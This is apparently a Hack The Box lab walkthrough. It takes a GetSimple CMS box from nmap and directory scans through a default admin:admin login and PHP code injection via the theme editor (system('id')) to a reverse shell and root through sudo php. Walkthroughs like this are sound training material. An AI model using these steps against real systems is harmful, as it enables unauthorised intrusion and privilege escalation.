## Enumeration / Recon

Nmap Scan - Check open ports

```bash
nmap -sCV -oN nmap.txt ip_addr
```

```bash
# Nmap 7.94SVN scan initiated Thu Jun  6 21:22:22 2024 as: nmap -sCV -oN nmap.txt -v 10.129.194.173
Nmap scan report for 10.129.194.173
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  6 21:22:34 2024 -- 1 IP address (1 host up) scanned in 12.30 seconds
```

> We see that there are only 2 ports open, SSH and HTTP, we can do some more recon on the web server as it is most likely our way to get a foothold on the machine.

### Web Enumeration

```bash
$ dirb http://10.129.194.173 -o dirb.out
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.out
START_TIME: Fri Jun  7 14:34:45 2024
URL_BASE: http://10.129.194.173/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.194.173/ ----
==> DIRECTORY: http://10.129.194.173/admin/                                                                                                                                                  
==> DIRECTORY: http://10.129.194.173/backups/                                                                                                                                                
==> DIRECTORY: http://10.129.194.173/data/                                                                                                                                                   
+ http://10.129.194.173/index.php (CODE:200|SIZE:5485)                                                                                                                                       
==> DIRECTORY: http://10.129.194.173/plugins/                                                                                                                                                
+ http://10.129.194.173/robots.txt (CODE:200|SIZE:32)                                                                                                                                        
+ http://10.129.194.173/server-status (CODE:403|SIZE:279)                                                                                                                                    
+ http://10.129.194.173/sitemap.xml (CODE:200|SIZE:431)                                                                                                                                      
==> DIRECTORY: http://10.129.194.173/theme/
```

We have an interesting directory /admin/
The webpage gives us a login prompt, checking most common default credentials, admin:admin and we are in.
At the bottom of the admin dashboard we can see that the webpage is running on - GetSimpleCMS 3.3.15
There are a lot of explpiots availalbe online but we can try to get a shell by manual exploitation.

One interesting thing I noticed the web page has is the theme module, we can edit themes which are a bunch of php files that can be run on the web server and they have no input sanitization and we can run the PHP system command.
To get to the theme editing page follow the steps below:

![image](https://github.com/brownPineapple/hackthebox/assets/30342446/6898f45a-250b-42f7-9ab6-3fb3e7af28cc)

It should take you to the Innovation theme default template page,
delete all the php code from the default template and put the following code -

```bash
<?php system ('id'); ?>
```

> NOTE: I lost access to the machine and had to spawn it again, please dont get confused if you see 2 different IPs.

![image](https://github.com/brownPineapple/hackthebox/assets/30342446/b7372da9-83ca-4572-8414-519e5dae9d94)

After making the changes, copy the url mentioned in the same webpage, it should look something like ```http://gettingstarted.htb/theme/Innovation/template.php```
If you are unable to visit this website make sure to edit the /etc/hosts file with the following command - sudo nano /etc/hosts
It should open the hosts file and at the bottom of the file add the following 
```bash
10.129.42.249    gettingstarted.htb
```

We have code execution
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/9b24239d-3f83-4bbc-8bef-4a11166e2c41)

Lets start up a ncat listener, you can also use nc
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/605147ff-77d5-4031-b0a8-bed22a78a4f8)

We will use a bash reverse shell payload.
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/25922b82-8a6b-4280-98a8-8df73ef37a51)

Save changes and refresh the theme/Innovation/template.php page
We get a reverse shell, lets use python pty to stabilize the shell
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/00b94010-da73-41d5-84d1-45c48e3f05e5)

Cool, now we can do Ctrl+c to stop processes and use Tab auto complete.
We are logged in as www-data, lets see what the user can do, first things first lets check the kernel version and if we can run any commands using sudo.
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/a817684d-1c14-48ec-acb6-cfa632bd8822)

Awesome, we can run ```/usr/bin/php``` using ```sudo``` without a password. Lets download a php reverse shell and place it under /tmp/
We can run php commands using the command line using the -r option, lets try to get the id.
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/da61432c-4131-47e4-8d6b-fbe3ede7e949)

PWN3D !!! I am ROOT !!!

You can get the flags from ```/root/root.txt and /home/mrb3n/user.txt```

Thanks for reading, if this helped you, please respect on HTB Labs - 
